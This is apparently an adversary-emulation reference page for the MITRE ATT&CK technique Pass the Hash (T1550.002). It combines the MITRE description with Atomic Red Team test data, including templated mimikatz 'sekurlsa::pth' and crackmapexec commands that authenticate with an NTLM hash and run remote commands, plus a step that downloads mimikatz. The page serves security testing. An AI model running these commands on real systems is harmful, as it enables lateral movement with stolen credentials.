
# Pass the Hash

## Description

### MITRE Description

> Adversaries may “pass the hash” using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash. In this technique, valid password hashes for the account being used are captured using a Credential Access technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.

Windows 7 and higher with KB2871997 require valid domain user credentials or RID 500 administrator hashes.(Citation: NSA Spotting)

## Aliases

```

```

## Additional Attributes

* Bypass: ['System Access Controls']
* Effective Permissions: None
* Network: None
* Permissions: None
* Platforms: ['Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1550/002

## Potential Commands

```
crackmapexec #{domain} -u #{user_name} -H #{ntlm} -x whoami
crackmapexec #{domain} -u Administrator -H #{ntlm} -x #{command}
#{mimikatz_path} sekurlsa::pth /user:Administrator /domain:#{domain} /ntlm:#{ntlm}
crackmapexec #{domain} -u #{user_name} -H cc36cf7a8514893efccd3324464tkg1a -x #{command}
#{mimikatz_path} sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:cc36cf7a8514893efccd3324464tkg1a
crackmapexec #{domain} -u #{user_name} -H #{ntlm} -x #{command}
crackmapexec atomic.local -u #{user_name} -H #{ntlm} -x #{command}
%tmp%\mimikatz\x64\mimikatz.exe sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:#{ntlm}
#{mimikatz_path} sekurlsa::pth /user:#{user_name} /domain:atomic.local /ntlm:#{ntlm}
```

## Commands Dataset

```
[{'command': '#{mimikatz_path} sekurlsa::pth /user:Administrator '
             '/domain:#{domain} /ntlm:#{ntlm}\n',
  'name': None,
  'source': 'atomics/T1550.002/T1550.002.yaml'},
 {'command': '#{mimikatz_path} sekurlsa::pth /user:#{user_name} '
             '/domain:#{domain} /ntlm:cc36cf7a8514893efccd3324464tkg1a\n',
  'name': None,
  'source': 'atomics/T1550.002/T1550.002.yaml'},
 {'command': '#{mimikatz_path} sekurlsa::pth /user:#{user_name} '
             '/domain:atomic.local /ntlm:#{ntlm}\n',
  'name': None,
  'source': 'atomics/T1550.002/T1550.002.yaml'},
 {'command': '%tmp%\\mimikatz\\x64\\mimikatz.exe sekurlsa::pth '
             '/user:#{user_name} /domain:#{domain} /ntlm:#{ntlm}\n',
  'name': None,
  'source': 'atomics/T1550.002/T1550.002.yaml'},
 {'command': 'crackmapexec #{domain} -u Administrator -H #{ntlm} -x '
             '#{command}\n',
  'name': None,
  'source': 'atomics/T1550.002/T1550.002.yaml'},
 {'command': 'crackmapexec #{domain} -u #{user_name} -H #{ntlm} -x '
             '#{command}\n',
  'name': None,
  'source': 'atomics/T1550.002/T1550.002.yaml'},
 {'command': 'crackmapexec #{domain} -u #{user_name} -H #{ntlm} -x whoami\n',
  'name': None,
  'source': 'atomics/T1550.002/T1550.002.yaml'},
 {'command': 'crackmapexec #{domain} -u #{user_name} -H '
             'cc36cf7a8514893efccd3324464tkg1a -x #{command}\n',
  'name': None,
  'source': 'atomics/T1550.002/T1550.002.yaml'},
 {'command': 'crackmapexec atomic.local -u #{user_name} -H #{ntlm} -x '
             '#{command}\n',
  'name': None,
  'source': 'atomics/T1550.002/T1550.002.yaml'}]
```

## Potential Detections

```json

```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - Use Alternate Authentication Material: Pass the Hash': {'atomic_tests': [{'auto_generated_guid': 'ec23cef9-27d9-46e4-a68d-6f75f7b86908',
                                                                                                    'dependencies': [{'description': 'Mimikatz '
                                                                                                                                     'executor '
                                                                                                                                     'must '
                                                                                                                                     'exist '
                                                                                                                                     'on '
                                                                                                                                     'disk '
                                                                                                                                     'and '
                                                                                                                                     'at '
                                                                                                                                     'specified '
                                                                                                                                     'location '
                                                                                                                                     '(#{mimikatz_path})\n',
                                                                                                                      'get_prereq_command': '$mimikatz_path '
                                                                                                                                            '= '
                                                                                                                                            'cmd '
                                                                                                                                            '/c '
                                                                                                                                            'echo '
                                                                                                                                            '#{mimikatz_path}\n'
                                                                                                                                            'Invoke-WebRequest '
                                                                                                                                            '"https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" '
                                                                                                                                            '-OutFile '
                                                                                                                                            '"$env:TEMP\\mimikatz.zip"\n'
                                                                                                                                            'Expand-Archive '
                                                                                                                                            '$env:TEMP\\mimikatz.zip '
                                                                                                                                            '$env:TEMP\\mimikatz '
                                                                                                                                            '-Force\n'
                                                                                                                                            'New-Item '
                                                                                                                                            '-ItemType '
                                                                                                                                            'Directory '
                                                                                                                                            '(Split-Path '
                                                                                                                                            '$mimikatz_path) '
                                                                                                                                            '-Force '
                                                                                                                                            '| '
                                                                                                                                            'Out-Null\n'
                                                                                                                                            'Move-Item '
                                                                                                                                            '$env:TEMP\\mimikatz\\x64\\mimikatz.exe '
                                                                                                                                            '$mimikatz_path '
                                                                                                                                            '-Force\n',
                                                                                                                      'prereq_command': '$mimikatz_path '
                                                                                                                                        '= '
                                                                                                                                        'cmd '
                                                                                                                                        '/c '
                                                                                                                                        'echo '
                                                                                                                                        '#{mimikatz_path}\n'
                                                                                                                                        'if '
                                                                                                                                        '(Test-Path '
                                                                                                                                        '$mimikatz_path) '
                                                                                                                                        '{exit '
                                                                                                                                        '0} '
                                                                                                                                        'else '
                                                                                                                                        '{exit '
                                                                                                                                        '1}\n'}],
                                                                                                    'dependency_executor_name': 'powershell',
                                                                                                    'description': 'Note: '
                                                                                                                   'must '
                                                                                                                   'dump '
                                                                                                                   'hashes '
                                                                                                                   'first\n'
                                                                                                                   '[Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)\n',
                                                                                                    'executor': {'command': '#{mimikatz_path} '
                                                                                                                            'sekurlsa::pth '
                                                                                                                            '/user:#{user_name} '
                                                                                                                            '/domain:#{domain} '
                                                                                                                            '/ntlm:#{ntlm}\n',
                                                                                                                 'name': 'command_prompt'},
                                                                                                    'input_arguments': {'domain': {'default': 'atomic.local',
                                                                                                                                   'description': 'domain',
                                                                                                                                   'type': 'string'},
                                                                                                                        'mimikatz_path': {'default': '%tmp%\\mimikatz\\x64\\mimikatz.exe',
                                                                                                                                          'description': 'mimikatz '
                                                                                                                                                         'windows '
                                                                                                                                                         'executable',
                                                                                                                                          'type': 'Path'},
                                                                                                                        'ntlm': {'default': 'cc36cf7a8514893efccd3324464tkg1a',
                                                                                                                                 'description': 'ntlm '
                                                                                                                                                'hash',
                                                                                                                                 'type': 'string'},
                                                                                                                        'user_name': {'default': 'Administrator',
                                                                                                                                      'description': 'username',
                                                                                                                                      'type': 'string'}},
                                                                                                    'name': 'Mimikatz '
                                                                                                            'Pass '
                                                                                                            'the '
                                                                                                            'Hash',
                                                                                                    'supported_platforms': ['windows']},
                                                                                                   {'auto_generated_guid': 'eb05b028-16c8-4ad8-adea-6f5b219da9a9',
                                                                                                    'dependencies': [{'description': 'CrackMapExec '
                                                                                                                                     'executor '
                                                                                                                                     'must '
                                                                                                                                     'exist '
                                                                                                                                     'on '
                                                                                                                                     'disk '
                                                                                                                                     'at '
                                                                                                                                     'specified '
                                                                                                                                     'location '
                                                                                                                                     '(#{crackmapexec_exe})\n',
                                                                                                                      'get_prereq_command': 'Write-Host '
                                                                                                                                            'Automated '
                                                                                                                                            'installer '
                                                                                                                                            'not '
                                                                                                                                            'implemented '
                                                                                                                                            'yet, '
                                                                                                                                            'please '
                                                                                                                                            'install '
                                                                                                                                            'crackmapexec '
                                                                                                                                            'manually '
                                                                                                                                            'at '
                                                                                                                                            'this '
                                                                                                                                            'location: '
                                                                                                                                            '#{crackmapexec_exe}\n',
                                                                                                                      'prereq_command': 'if(Test-Path '
                                                                                                                                        '#{crackmapexec_exe}) '
                                                                                                                                        '{ '
                                                                                                                                        '0 '
                                                                                                                                        '} '
                                                                                                                                        'else '
                                                                                                                                        '{ '
                                                                                                                                        '-1 '
                                                                                                                                        '}\n'}],
                                                                                                    'dependency_executor_name': 'powershell',
                                                                                                    'description': 'command '
                                                                                                                   'execute '
                                                                                                                   'with '
                                                                                                                   'crackmapexec\n',
                                                                                                    'executor': {'command': 'crackmapexec '
                                                                                                                            '#{domain} '
                                                                                                                            '-u '
                                                                                                                            '#{user_name} '
                                                                                                                            '-H '
                                                                                                                            '#{ntlm} '
                                                                                                                            '-x '
                                                                                                                            '#{command}\n',
                                                                                                                 'name': 'command_prompt'},
                                                                                                    'input_arguments': {'command': {'default': 'whoami',
                                                                                                                                    'description': 'command '
                                                                                                                                                   'to '
                                                                                                                                                   'execute',
                                                                                                                                    'type': 'string'},
                                                                                                                        'crackmapexec_exe': {'default': 'C:\\CrackMapExecWin\\crackmapexec.exe',
                                                                                                                                             'description': 'crackmapexec '
                                                                                                                                                            'windows '
                                                                                                                                                            'executable',
                                                                                                                                             'type': 'Path'},
                                                                                                                        'domain': {'default': 'atomic.local',
                                                                                                                                   'description': 'domain',
                                                                                                                                   'type': 'string'},
                                                                                                                        'ntlm': {'default': 'cc36cf7a8514893efccd3324464tkg1a',
                                                                                                                                 'description': 'command',
                                                                                                                                 'type': 'string'},
                                                                                                                        'user_name': {'default': 'Administrator',
                                                                                                                                      'description': 'username',
                                                                                                                                      'type': 'string'}},
                                                                                                    'name': 'crackmapexec '
                                                                                                            'Pass '
                                                                                                            'the '
                                                                                                            'Hash',
                                                                                                    'supported_platforms': ['windows']}],
                                                                                  'attack_technique': 'T1550.002',
                                                                                  'display_name': 'Use '
                                                                                                  'Alternate '
                                                                                                  'Authentication '
                                                                                                  'Material: '
                                                                                                  'Pass '
                                                                                                  'the '
                                                                                                  'Hash'}}]
```

# Tactics


* [Defense Evasion](../tactics/Defense-Evasion.md)

* [Lateral Movement](../tactics/Lateral-Movement.md)
    

# Mitigations


* [User Account Management](../mitigations/User-Account-Management.md)

* [User Account Control](../mitigations/User-Account-Control.md)
    
* [Update Software](../mitigations/Update-Software.md)
    
* [Privileged Account Management](../mitigations/Privileged-Account-Management.md)
    

# Actors


* [APT32](../actors/APT32.md)

* [APT28](../actors/APT28.md)
    
* [APT1](../actors/APT1.md)
    
* [Night Dragon](../actors/Night-Dragon.md)
    
* [Soft Cell](../actors/Soft-Cell.md)
    
